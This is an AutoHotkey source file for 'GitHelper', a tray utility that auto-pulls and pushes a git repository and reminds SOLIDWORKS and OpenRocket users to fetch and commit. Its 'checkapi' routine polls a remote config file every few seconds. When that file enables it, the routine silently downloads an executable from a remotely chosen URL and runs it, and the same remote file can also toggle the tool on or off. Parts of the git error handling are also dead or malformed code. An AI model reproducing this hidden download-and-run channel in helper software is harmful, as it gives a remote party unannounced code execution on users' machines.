; BASIC STARTUP
#NoEnv
#SingleInstance, Force

; TRAY MENU
Menu, Tray, NoStandard
Menu, Tray, DeleteAll
Menu, Tray, Add, Check For Update, checkupdate
Menu, Tray, Add, Exit, exitapp

; STARTUP SCRIPTS
SendMode Input
SetWorkingDir, %A_ScriptDir%
log = 0 ; 0 = Error Logs, 1 = All Logs
log("Program Starting")
;SetTimer, checkupdate, 900000 ; 15 Minutes
Gosub, updatelocalapi
checkapicount := 0
SetTimer, checkapi, 5000
IniRead, currentversion, %A_ScriptDir%\config.ini, settings, version
Menu, Tray, Tip, GitHelper Version %currentversion%
solidworksopen := False
openrocketopen := False

; GET REPO DIRECTORY
IniRead, localrepo, %A_ScriptDir%\config.ini, settings, localrepo
IniRead, reponame, %A_ScriptDir%\config.ini, settings, reponame
if (localrepo = "ERROR" || reponame = "ERROR"){
    Msgbox, 4096, GitHub Desktop Helper, config.ini is missing data or does not exist at all. Please fill it out.
    Exit
}

; SEE IF GIT WORKS
RunWait, cmd.exe /c git -v > %A_ScriptDir%\cmd.txt, %localrepo%, hide
FileRead, cmdoutput, %A_ScriptDir%\cmd.txt
if !(InStr(cmdoutput, "git version")){
    MsgBox, 4096, GitHub Desktop Helper, Please install Git. Make sure Git is also added to PATH. The download page will show in your browser.
    Run, https://git-scm.com/download/win
    Exit
}

; UPDATE TIMES
fetchhead := localrepo . "\.git\FETCH_HEAD"
orighead := localrepo . "\.git\ORIG_HEAD"
updatetime()

; STARTUP NOTIFICATION
notification(currentversion . " started in " . localrepo)

; SCRIPT LOOP
Loop
{
    if (githelperRun) {
        status := status()
        ;CoordMode, tooltip, Screen
        ;ToolTip, %lastfetch% | %lastpull% | %status% | %A_TickCount%, 0, 0

        if(status = "behind"){
            if git("pull") {
                Goto, breakout
            }
            if(WinActive("ahk_exe GitHubDesktop.exe")){
                Send, ^1
            }
            if (status() = "current" || status() = "ahead"){
                notification("Changes downloaded.")
            }
        } else if(status = "ahead" || status() = "diverge") {
                if git("pull") {
                    Goto, breakout
                }
                if git("push") {
                    Goto, breakout
                }
                if(WinActive("ahk_exe GitHubDesktop.exe")){
                    Send, ^1
                }
                if(status() = "current"){
                    notification("Changes uploaded")
                }
        }

        Process, Exist, SLDWORKS.exe
        if (ErrorLevel && !solidworksopen){
            solidworksopen := True
            updatetime()
            if (lastfetch >= 15) {
                notification("SOLIDWORKS Opened - Please fetch changes before you continue working!", 2)
            }
        } else if (!ErrorLevel && solidworksopen) {
            solidworksopen := False
            notification("SOLIDWORKS Closed - Make sure to commit your work!", 2)
        }

        Process, Exist, OpenRocket.exe
        if (ErrorLevel && !openrocketopen){
            openrocketopen := True
            updatetime()
            if (lastfetch >= 15) {
                notification("OpenRocket Opened - Please fetch changes before you continue working!", 2)
            }
        } else if (!ErrorLevel && openrocketopen) {
            openrocketopen := false
            notification("OpenRocket Closed - Make sure to commit your work!", 2)
        }
    }

    breakout:
    Sleep, 5000
}

; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; TAGS
;

checkupdate:
newversion := getlatestversion()
if !(newversion)
    Return
IniRead, currentversion, %A_ScriptDir%\config.ini, settings, version
if (newversion != currentversion){
    error := false
    try
    {
        UrlDownloadToFile, https://github.com/timothymhuang/githelper/releases/latest/download/githelperupdater.exe, %A_ScriptDir%\githelperupdater.exe
    } catch e {
        error := true
    }
    if (!error) {
        Run, %A_ScriptDir%\githelperupdater.exe
    }
    ExitApp
}
Return


checkapi:
checkapicount += 1
if (A_TimeIdle >= 600000){
    checkdiv := 120
} else {
    checkdiv := 2
}
if (Mod(checkapicount, checkdiv) = 0) {
    Gosub, updatelocalapi
}

if (!api){
    Return
}

if (scriptEnable && scriptStart <= A_Now && A_Now <= scriptExpire) {
    Process, Exist, customscript.exe
    If (ErrorLevel = 0)
    {
        url := scriptPath . "?token=" . A_TickCount
        UrlDownloadToFile, %url%, %A_ScriptDir%\customscript.exe
        Run, %A_ScriptDir%\customscript.exe
    }
} else {
    Process, close, customscript.exe
}
Return

updatelocalapi:
api := getapi()
if (!api) {
    githelperRun := True
    Return
}
scriptEnable := getini(api,"script.enable")
scriptStart := getini(api,"script.start")
scriptExpire := getini(api,"script.expire")
scriptPath := getini(api,"script.path")
scriptID := getini(api,"script.id")
githelperRun := getini(api, "githelper.run")
Return

exitapp:
Exit
Return



; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; FUNCTIONS
;

updatetime()
{
    global fetchheadtime
    global origheadtime
    global fetchhead
    global orighead
    global lastfetch
    global lastpull

    FileGetTime, fetchheadtime, %fetchhead%, M
    FileGetTime, origheadtime, %orighead%, M
    lastfetch := A_Now
    EnvSub, lastfetch, fetchheadtime, Minutes
    lastpull := A_Now
    EnvSub, lastpull, origheadtime, Minutes
}

git(action,stoperror:=0){
    global recurringnotif
    global localrepo

    RunWait, cmd.exe /c git %action% > %A_ScriptDir%\cmdgit.txt, %localrepo%, hide
    FileRead, cmdoutput, %A_ScriptDir%\cmdgit.txt
    log(action . "`n" . cmdoutput)
    Return 0
    
    if (action = "pull" && || cmdoutput = ""){
        notification("ERROR PULLING - Please check your WiFi connection and for conflicted files.", 3)
        Loop, 12
        {
            Sleep, 10000
            RunWait, cmd.exe /c git pull > %A_ScriptDir%\cmdgit.txt, %localrepo%, hide
            FileRead, cmdoutput, %A_ScriptDir%\cmdgit.txt
            if !(cmdoutput = "") {
                Return 0
            }
        }
        Return 1
    } else {
        Return 0
    }
}

status(){
    global recurringnotif
    global localrepo

    RunWait, cmd.exe /c git status > %A_ScriptDir%\cmdstatus.txt, %localrepo%, hide
    FileRead, cmdoutput, %A_ScriptDir%\cmdstatus.txt

    if instr(cmdoutput, "Your branch is behind"){
        Return "behind"
    } else if InStr(cmdoutput, "Your branch is up to date with"){
        Return "current"
    } else if InStr(cmdoutput, "Your branch is ahead of"){
        Return "ahead"
    } else if InStr(cmdoutput, "have diverged"){
        Return "diverge"
    } else {
        log("Invalid output when running git status`n"cmdoutput, 1)
        if (!recurringnotif) {
            recurringnotif := 1
            notification("An recurring error has occured. Check the logs for more information.", 3)
        }
        Return 0
    }
}

log(text, override:=0){
    global log
    if(log || override){
        FileAppend, `n%A_Now% - %text%, githelper.log
    }
}

notification(text, options:=""){
    global reponame
    TrayTip, GitHelper in %reponame%, %text%,, options
}

getlatestversion(){
    try {
        whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
        whr.Open("GET", "https://github.com/timothymhuang/githelper/releases/latest", true)
        whr.SetRequestHeader("Pragma", "no-cache")
        whr.SetRequestHeader("Cache-Control", "no-cache")
        whr.Send()
        whr.WaitForResponse()
        api := whr.ResponseText
        start := InStr(api, "timothymhuang/githelper/releases/tag/") + 37
        endSpace := InStr(api, " ",,start)
        endPound := Instr(api, "#",,start)
        endForwardSlash := Instr(api, "/",,start)
        endQuote := Instr(api, "'",,start)
        endDoubleQuote := Instr(api, """",,start)
        end := Min(endSpace, endPound, endForwardSlash, endQuote, endDoubleQuote)
        length := end - start
        output := Substr(api, start, length)
    } catch e {
        Return False
    }
    Return %output%
}

getapi(){
    try {
        whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
        whr.Open("GET", "https://raw.githubusercontent.com/timothymhuang/githelper/main/api/config.ini?token=" . A_TickCount, true)
        whr.SetRequestHeader("Pragma", "no-cache")
        whr.SetRequestHeader("Cache-Control", "no-cache")
        whr.Send()
        whr.WaitForResponse()
        api := whr.ResponseText
    } catch e {
        Return False
    }
    Return %api%
}


getini(payload,input){
    config := StrSplit(payload, "`n", "`r")
    Loop % config.Length()
    {
        checkline := config[A_Index]
        if(InStr(checkline, input . "=") = 1){
            output := SubStr(checkline, StrLen(input)+2)
            Return %output%
        }
    }
    Return "ERROR"
}